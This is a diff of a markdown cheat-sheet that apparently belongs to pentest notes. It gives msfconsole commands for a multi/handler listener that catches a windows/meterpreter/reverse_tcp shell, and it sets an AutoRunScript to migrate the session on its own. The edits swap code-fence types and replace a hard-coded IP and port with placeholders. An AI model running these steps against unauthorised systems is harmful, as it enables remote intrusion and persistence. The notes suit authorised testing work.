@@ -4,32 +4,31 @@ date: 2024-6-26
 tags: ["metasploit", "listener", "revshell", "msfconsole"]
 ---
 
----
 ### Start a Metasploit Listener
 
 <div>
 
-```bash
+```console
 msfconsole -q
 ```
 
-```bash
+```console
 use exploit/multi/handler
 ```
 
-```bash
+```console
 set payload windows/meterpreter/reverse_tcp
 ```
 
-```bash
-set lhost 10.10.14.10
+```console
+set lhost <LOCAL_IP>
 ```
 
-```bash
-set lport 443
+```console
+set lport <LOCAL_PORT>
 ```
 
-```bash
+```console
 run
 ```
 
@@ -41,7 +40,7 @@ run
 
 <div>
 
-```bash
+```console
 # Create a automigrate.rc script
 run post/windows/manage/migrate
 ```
@@ -52,31 +51,31 @@ run post/windows/manage/migrate
 
 <div>
 
-```bash
+```console
 msfconsole -q
 ```
 
-```bash
+```console
 use exploit/multi/handler
 ```
 
-```bash
+```console
 set payload windows/meterpreter/reverse_tcp
 ```
 
-```bash
-set lhost 10.10.14.10
+```console
+set lhost <LOCAL_IP>
 ```
 
-```bash
-set lport 443
+```console
+set lport <LOCAL_PORT>
 ```
 
-```bash
+```console
 set AutoRunScript multi_console_command -r automigrate.rc
 ```
 
-```bash
+```console
 run
 ```
 
